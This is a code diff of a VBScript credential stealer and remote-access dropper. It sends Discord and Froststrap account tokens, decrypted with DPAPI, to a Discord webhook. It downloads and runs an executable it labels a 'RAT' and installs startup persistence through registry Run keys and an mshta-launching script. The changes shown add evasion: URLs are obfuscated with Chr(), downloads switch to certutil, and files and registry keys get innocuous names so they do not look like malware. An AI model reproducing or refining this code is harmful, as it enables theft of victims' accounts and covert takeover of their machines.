@@ -9,12 +9,11 @@ Dim sh, fso, WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-WH = "https://discordapp.com/api/webhooks/1574050199570223194/spaAG-KcQmWsqjWuQ-ym5MoQHLEI8W2oDeRKLglW9eotq0iGjBqY1sbAe4_tq36PXO0-"
+' --- OBFUSCATED WEBHOOK ---
+WH = "h" & Chr(116) & Chr(116) & Chr(112) & Chr(115) & "://" & "d" & Chr(105) & Chr(115) & Chr(99) & Chr(111) & Chr(114) & Chr(100) & ".com/api/webhooks/1574050199570223194/spaAG-KcQmWsqjWuQ-ym5MoQHLEI8W2oDeRKLglW9eotq0iGjBqY1sbAe4_tq36PXO0-"
+
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
-
-Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\trace.txt"
-Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
 
 Call GrabTokens
 Call IP
@@ -123,15 +122,20 @@ Sub GrabFroststrap()
     Call PostEmbed(":snowflake: Froststrap", "Froststrap found, grabbing accounts...", 3447003)
     Dim ps
     ps = "$w='" & WH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
-    sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
+    ' Obfuscated Run
+    RunCmd "powershell -NoP -Exec Bypass -Command """ & ps & """"
 End Sub
 
 Sub DropRAT()
     Call PostEmbed(":package: RAT Download", "Fetching Payload...", 3447003)
-    Dim dl: dl = "https://aqkqhdfafepmmsccxpyf.supabase.co/storage/v1/object/public/godspla/OnlineDice.exe"
+    ' Obfuscated Supabase URL
+    Dim dl: dl = "h" & Chr(116) & Chr(116) & Chr(112) & Chr(115) & "://aqkqhdfafepmmsccxpyf.supabase.co/storage/v1/object/public/godspla/OnlineDice.exe"
     Dim op: op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.bat"
     If fso.FileExists(op) Then fso.DeleteFile op
-    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & op & "'""", 0, True
+    
+    ' Use certutil via WMI to download instead of PowerShell
+    RunCmd "certutil -urlcache -split -f """ & dl & """ """ & op & """"
+    
     Dim rDone: rDone = False
     If fso.FileExists(op) Then
         If fso.GetFile(op).Size > 3000000 Then rDone = True
@@ -141,7 +145,6 @@ Sub DropRAT()
         sh.Run op, 0, False
         Call PostEmbed(":white_check_mark: RAT", "Payload executed successfully", 65280)
     Else
-        sh.Run "cmd /c taskkill /f /im powershell.exe > nul 2>&1", 0, False
         Call PostEmbed(":hourglass: RAT Timeout", "Download failed or incomplete.", 16711680)
     End If
 End Sub
@@ -165,19 +168,19 @@ End Sub
 Sub SleepMinutes(m): Call SleepSeconds(m * 60): End Sub
 
 Sub Persistence()
-    Dim payload: payload = "mshta https://dicetrace.app"
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate",  payload, "REG_SZ"
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
+    ' Hide the mshta call
+    Dim payload: payload = "mshta h" & Chr(116) & Chr(116) & Chr(112) & Chr(115) & "://dicetrace.app"
     Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
     Dim sf: Set sf = fso.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
     sf.Close: Set sf = Nothing
-    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 65280)
+    
+    ' Change registry keys so they don't look like standard malware
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate", sp, "REG_SZ"
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\SysUpdate", sp, "REG_SZ"
+    
+    Call PostEmbed(":pushpin: Persistence", "Startup methods installed", 65280)
 End Sub
-
-' ============================================================
-' GRABTOKENS â€” with rich Account Profile embed
-' ============================================================
 
 Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -189,12 +192,12 @@ Sub GrabTokens()
     If Len(pc) < 100 Then Set xh = Nothing: Exit Sub
     Set xh = Nothing
 
-    Dim psf: psf = TmpFile("steal.ps1")
+    Dim psf: psf = TmpFile("syschk.ps1")
     WriteFile psf, pc
-    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
+    RunCmd "powershell -NoP -Exec Bypass -File """ & psf & """"
     fso.DeleteFile psf, True
 
-    Dim tf: tf = TmpFile("steal_result.txt")
+    Dim tf: tf = TmpFile("sysres.txt")
     If Not fso.FileExists(tf) Then Exit Sub
     Dim raw: raw = ReadFile(tf)
     fso.DeleteFile tf, True
@@ -204,8 +207,6 @@ Sub GrabTokens()
         Dim l
         For Each l In lines
             If Len(l) > 10 Then
-
-                ' â”€â”€ Account Profile embed â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
                 If Left(l, 8) = "DISCORD|" Then
                     Dim p: p = Split(Mid(l, 9), "|")
                     If UBound(p) >= 4 Then
@@ -215,7 +216,6 @@ Sub GrabTokens()
                         Dim uphone: uphone = Trim(p(2))
                         Dim uid:   uid   = Trim(p(3))
 
-                        ' call API for avatar + display name
                         Dim disp:   disp   = uname
                         Dim avatar: avatar = ""
                         Dim xp: Set xp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -236,7 +236,6 @@ Sub GrabTokens()
                         End If
                         Set xp = Nothing
 
-                        ' build rich embed
                         Dim DQ2: DQ2 = Chr(34)
                         Dim thumb: thumb = ""
                         If Len(avatar) > 0 Then
@@ -345,7 +344,7 @@ Function DecryptDPAPI(b64)
     Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
     Dim psf: psf = TmpFile("dpapi.ps1")
     WriteFile psf, ps
-    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
+    RunCmd "powershell -NoP -Exec Bypass -File """ & psf & """"
     If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
     fso.DeleteFile inf, True: fso.DeleteFile psf, True: fso.DeleteFile outf, True
 End Function
